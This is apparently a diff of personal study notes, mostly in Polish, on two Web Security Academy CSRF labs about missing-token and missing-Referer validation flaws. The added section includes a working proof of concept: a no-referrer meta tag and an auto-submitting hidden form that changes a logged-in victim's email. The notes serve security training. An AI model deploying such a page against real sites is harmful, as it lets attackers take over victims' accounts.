@@ -1,3 +1,5 @@
+tip! email w csrf poc nie może być w url encoded, wpisac reczniew@w.pl
+
 Lab: CSRF where token validation depends on token being present
 
 chodzi o to, że payload ma miec uniklny adres email i po uzyciu w exploit server, na naszej stronie zmieni sie adres
@@ -25,3 +27,35 @@ atak może być przeprowadzony na każdym zalogowanym tutaj userze, ktoremu zmie
 </script>
   </body>
 </html>
+
+
+
+
+Lab: CSRF where Referer validation depends on header being present
+
+Referer to nagłówek HTTP który przeglądarka wysyła automatycznie – mówi serwerowi skąd przyszedł request (z jakiej strony).
+✅ Referer z dobrej domeny → akceptuje
+❌ Referer z obcej domeny → odrzuca
+✅ Brak Referer w ogóle → akceptuje ← to jest błąd!
+
+1. log in
+2. updateemail
+3. burp proxy: jak zmienie domene w referer HTTP header to request jest odrzucony, jak usune referer to jest ok
+4. zrobić exploit z referer 
+<meta name="referrer" content="no-referrer">
+5. Zrobić nowy adres zanim wcisne deliver > DELIVEWR TO THE VICTIM
+
+
+<meta name="referrer" content="no-referrer">
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything@web-security-academy.net">
+</form>
+
+<script>
+    document.forms[0].submit();
+</script>
+
+
+
+
